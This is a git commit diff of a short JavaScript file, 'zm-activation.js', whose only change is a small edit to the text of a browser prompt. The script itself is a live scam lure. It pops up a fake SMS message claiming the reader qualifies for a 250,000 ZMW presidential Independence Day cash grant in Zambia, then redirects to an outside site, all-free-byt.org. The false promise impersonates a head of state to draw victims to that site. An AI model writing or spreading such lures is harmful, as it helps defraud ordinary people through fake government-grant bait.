16deb9d0613343e9d872faa82af70912fcf5f141
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-10-11 18:08:24 -0700

    Update zm-activation.js

--- zm-activation.js
+++ zm-activation.js
@@ -1,6 +1,6 @@
 
 var password = 'WITHDRAW 250,000ZMW'
-password=prompt('SMS: SMS: Congratulations You are qualify for President Hakainde Hichilema 250,000ZMW INDEPENDENCE DAY CASH GRANT FOR ZAMBIAN, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 250,000ZMW');
+password=prompt('SMS: Congratulations You are qualify for President Hakainde Hichilema 250,000ZMW INDEPENDENCE DAY CASH GRANT FOR ZAMBIAN, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 250,000ZMW');
 if (password != 'WITHDRAW 250,000ZMW') {
 location.href='https://all-free-byt.org/zambian.html';
 }
